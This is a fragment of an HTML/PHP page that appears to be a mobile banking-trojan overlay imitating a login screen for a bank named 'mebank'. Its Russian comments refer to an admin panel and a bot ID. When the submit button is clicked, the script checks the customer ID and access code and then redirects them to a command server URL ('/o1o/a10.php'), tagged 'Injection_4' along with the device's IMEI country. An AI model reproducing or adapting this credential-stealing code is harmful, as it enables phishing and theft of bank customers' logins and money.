					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "mebank'+
					'", "customer_id": "'+oNumInp.value+
					'", "access_code": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
					    var imei_c='<?php echo $IMEI_country; ?>';
					    location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|mebank|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>

</body>
</html>
